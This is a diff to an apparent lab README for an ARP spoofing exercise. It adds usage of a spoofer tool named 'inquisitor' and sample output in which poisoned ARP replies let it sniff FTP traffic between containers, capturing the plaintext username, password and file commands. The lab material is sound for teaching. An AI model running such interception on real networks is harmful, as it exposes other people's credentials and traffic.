@@ -32,11 +32,38 @@ ftp> mypass # password
 ftp> ls # list files in /home/ftp_client in ftp server.
 ftp> get [some file] # load [some file] in current directory from ftp server
 ftp> put [some file] # upload [some file] in current directory to ftp server
+
+# to see arp table
+shell % arp -a
 ```
 
 ```bash
 # for spoofer container
 shell % ./inquisitor [IP-src] [MAC-src] [IP-target] [MAC-target]
+
+# When execute commands listed above in the ftp client container,
+# the output will be ...
+...
+sending poisoned ARP response...
+.
+Sent 1 packets.
+.
+Sent 1 packets.
+sniffing...
+b'USER ftp_client\r\n'
+...
+b'PASS mypass\r\n'
+...
+b'LIST\r\n'
+...
+b'SIZE kusamakura.txt\r\n'
+b'EPSV\r\n'
+b'RETR kusamakura.txt\r\n'
+b'MDTM kusamakura.txt\r\n'
+...
+b'EPSV\r\n'
+b'STOR romeojuliet.txt\r\n'
+...
 ```
 
 
